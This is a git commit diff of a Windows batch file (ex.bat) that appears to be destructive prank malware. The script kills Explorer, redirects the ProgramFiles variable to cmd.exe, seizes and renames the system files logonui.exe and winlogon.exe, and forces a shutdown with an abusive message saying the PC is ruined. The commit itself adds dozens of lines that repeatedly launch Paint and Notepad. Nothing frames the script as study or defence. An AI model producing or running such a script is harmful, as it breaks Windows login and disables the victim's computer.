899e7600d33a11eb661ea195069170e71811426a
55guh <online.cdn25@gmail.com>
2025-08-17 17:36:49 -0400

    e

--- ex.bat
+++ ex.bat
@@ -4,7 +4,7 @@ timeout /T 3 /NOBREAK
 setx ProgramFiles="C:/Windows/System32/cmd.exe"
 taskkill /f /im explorer.exe
 timeout /T 2 /NOBREAK
-start paint
+start mspaint
 start notepad
 takeown /f c:\windows\system32\logonui.exe
 takeown /f c:\windows\system32\winlogon.exe
@@ -14,3 +14,32 @@ ren c:\windows\system32\logonui2.exe logonui.exe
 ren c:\windows\system32\winlogon2.exe winlogon.exe
 shutdown /s /t 120 /c "YOUR PC HAS BEEN FUCKED, ENJOY HAVING NO PC!!!"
 start explorer.exe
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+start mspaint
+start notepad
+v
